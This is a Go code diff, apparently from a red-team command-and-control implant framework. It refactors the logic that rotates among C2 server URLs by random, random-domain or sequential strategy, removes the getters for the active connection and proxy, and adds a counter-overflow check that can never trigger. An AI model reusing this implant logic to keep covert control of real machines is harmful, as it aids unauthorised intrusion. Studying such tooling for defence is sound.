@@ -30,37 +30,10 @@ import (
 )
 
 const (
-	StrategyRandom       = "r"
-	StrategyRandomDomain = "rd"
-	StrategySequential   = "s"
+	strategyRandom       = "r"
+	strategyRandomDomain = "rd"
+	strategySequential   = "s"
 )
-
-var (
-	maxErrors         = GetMaxConnectionErrors()
-	reconnectInterval = time.Duration(0)
-
-	activeC2         string
-	activeConnection *Connection
-	proxyURL         string
-)
-
-// GetActiveC2 returns the URL of the C2 in use
-func GetActiveC2() string {
-	return activeC2
-}
-
-// GetProxyURL return the URL of the current proxy in use
-func GetProxyURL() string {
-	if proxyURL == "" {
-		return "none"
-	}
-	return proxyURL
-}
-
-// GetActiveConnection returns the Connection of the C2 in use
-func GetActiveConnection() *Connection {
-	return activeConnection
-}
 
 // C2Generator - Creates a stream of C2 URLs based on a connection strategy
 func C2Generator(c2Servers []string, abort <-chan struct{}) <-chan *url.URL {
@@ -70,23 +43,26 @@ func C2Generator(c2Servers []string, abort <-chan struct{}) <-chan *url.URL {
 	generator := make(chan *url.URL)
 	go func() {
 		defer close(generator)
-		c2Counter := 0
+		c2Counter := uint(0)
 		for {
 			var next string
 			switch "{{.Config.ConnectionStrategy}}" {
-			case StrategyRandom: // Random
+			case strategyRandom: // Random
 				next = c2Servers[insecureRand.Intn(len(c2Servers))]
-			case StrategyRandomDomain: // Random Domain
+			case strategyRandomDomain: // Random Domain
 				// Select the next sequential C2 then use it's protocol to make a random
 				// selection from all C2s that share it's protocol.
 				next = c2Servers[insecureRand.Intn(len(c2Servers))]
 				next = randomCCDomain(c2Servers, next)
-			case StrategySequential: // Sequential
-				next = c2Servers[c2Counter%len(c2Servers)]
+			case strategySequential: // Sequential
+				next = c2Servers[c2Counter%uint(len(c2Servers))]
 			default:
-				next = c2Servers[c2Counter%len(c2Servers)]
+				next = c2Servers[c2Counter%uint(len(c2Servers))]
 			}
 			c2Counter++
+			if ^uint(0) < c2Counter {
+				panic("counter overflow")
+			}
 			uri, err := url.Parse(next)
 			if err != nil {
 				// {{if .Config.Debug}}
@@ -132,6 +108,11 @@ func randomCCDomain(ccServers []string, next string) string {
 	}
 	return pool[insecureRand.Intn(len(pool))]
 }
+
+var (
+	// reconnectInterval - DO NOT ACCESS DIRECTLY
+	reconnectInterval = time.Duration(0)
+)
 
 // GetReconnectInterval - Parse the reconnect interval inserted at compile-time
 func GetReconnectInterval() time.Duration {
